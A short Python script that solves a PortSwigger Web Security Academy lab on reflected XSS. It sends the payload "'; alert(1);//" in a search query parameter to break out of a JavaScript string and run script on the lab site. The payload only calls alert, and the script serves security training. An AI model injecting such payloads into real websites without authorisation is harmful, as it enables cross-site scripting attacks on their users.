########################################################################################
#
# Author: Ahmed Elqalaawy (@elqal3awii)
#
# Date: 17/11/2023
#
# Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded
#
# Steps: 1. Inject payload in the search query parameter to call the alert function
#        2. Observe that the script has been executed
#
########################################################################################


###########
# imports
###########
import requests
from colorama import Fore


#########
# Main
#########

# change this to your lab URL
url = "https://0a7100df038e179d83301a230043005f.web-security-academy.net"

# payload to call the alert function
payload = "'; alert(1);//"

try:
    # fetch the page with the injected payload
    requests.get(f"{url}?search={payload}")

except:
    print(Fore.RED + "[!] Failed to fetch the page with the injected payload through exception")
    exit(1)

print(Fore.WHITE + "❯❯ Injecting payload in the search query parameter to call the alert function.. " + Fore.GREEN + "OK")
print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")



